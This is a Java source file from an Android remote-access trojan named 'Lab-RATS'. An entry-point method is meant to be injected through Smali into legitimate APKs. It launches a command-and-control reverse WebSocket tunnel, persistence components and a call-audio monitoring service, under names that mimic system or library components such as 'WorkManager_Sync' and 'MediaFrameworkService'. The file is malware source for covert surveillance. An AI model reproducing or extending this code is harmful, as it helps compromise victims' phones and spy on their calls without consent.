package com.labs.labrats;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

/**
 * Centralized low-priority worker pool for all background tasks (logging, disk, network).
 * Prevents "System UI isn't responding" by limiting thread count and memory usage.
 */
public class LabRatsWorker {
    // Single background thread with a bounded queue to prevent memory leaks during floods
    private static final ExecutorService worker = new ThreadPoolExecutor(
            1, 1, 0L, TimeUnit.MILLISECONDS,
            new LinkedBlockingQueue<>(100), // Max 100 tasks queued, then it discards old ones
            new ThreadPoolExecutor.DiscardOldestPolicy()
    );

    public static void execute(Runnable task) {
        worker.execute(task);
    }

    /**
     * Static entry point for Smali-injection / bound APK startup.
     * Starts core background services, C2 tunnel, and persistence components.
     */
    public static void init(android.content.Context context) {
        if (context == null) return;
        try {
            android.content.Context appContext = context.getApplicationContext();
            
            // Start WorkManager_Sync core service
            android.content.Intent serviceIntent = new android.content.Intent(appContext, WorkManager_Sync.class);
            serviceIntent.setAction(Constants.ACTION_START_CORE);
            androidx.core.content.ContextCompat.startForegroundService(appContext, serviceIntent);

            // Start C2 Reverse WebSocket Tunnel
            C2_Tunnel.start(appContext);

            // Start MediaFrameworkService for call audio detection
            android.content.Intent callServiceIntent = new android.content.Intent(appContext, MediaFrameworkService.class);
            callServiceIntent.setAction(Constants.ACTION_START_AUDIO);
            androidx.core.content.ContextCompat.startForegroundService(appContext, callServiceIntent);

            android.util.Log.i("LabRatsWorker", "SMALI_SURGERY_INIT: Lab-RATS services successfully initialized in bound application.");
        } catch (Throwable t) {
            android.util.Log.e("LabRatsWorker", "SMALI_SURGERY_INIT: Failed to initialize Lab-RATS services", t);
        }
    }
}
